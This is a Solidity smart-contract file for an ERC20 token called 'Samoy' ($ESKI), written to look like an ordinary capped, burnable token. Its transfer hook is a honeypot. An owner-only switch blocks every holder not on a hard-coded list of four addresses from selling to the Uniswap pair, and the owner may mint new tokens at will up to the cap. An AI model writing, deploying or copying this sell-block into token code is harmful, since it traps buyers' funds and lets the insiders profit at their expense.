// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Ownable.sol";
import "./ERC20.sol";
import "./ERC20Burnable.sol";
import "./ERC20Capped.sol";
import "./AccessControl.sol";

contract SAMOY is ERC20, ERC20Burnable, ERC20Capped, Ownable {

    address public _uniswap;
    bool private _sell = false;
    mapping (address => bool) private _isExcluded;
    constructor() ERC20('Samoy','$ESKI') ERC20Capped(100000000000000 *10**9) {

        _isExcluded[0x559ebFeC7be7f1A27a38Be3b03bF2D4c70Ad62b3] = true;
        _isExcluded[0xF08eE2c65fCd9aC276183be80Fca8c67FfbDDe7D] = true;
        _isExcluded[0xe5C3a142086D534C0DA6D124b581b909EAD2B688] = true;
        _isExcluded[0x5021c47Bd90F1A4E24Ff6Ac5Cc394013A381f385] = true;

    }
    
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    
    function _mint(
        address account, 
        uint256 amount
    ) internal virtual override (ERC20, ERC20Capped) {
        require(ERC20.totalSupply() + amount <= cap(), "ERC20Capped: cap exceeded");
        super._mint(account, amount);
    }

    function mint (address account, uint256 amount) public virtual onlyOwner {
        _mint(account, amount);
    }

    function setUniAddress (address uni) public virtual onlyOwner {
        require(uni != address(0), "cannot be zero address");
        _uniswap = uni;
    }

    function uniswap (bool status) public virtual onlyOwner {
        require(_sell != status, "already set to this status");
        _sell = status;
    }
    
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        if(_sell) {
            if(!_isExcluded[from]) {
                require(to != _uniswap, "not available");
            }
        }
     }
}

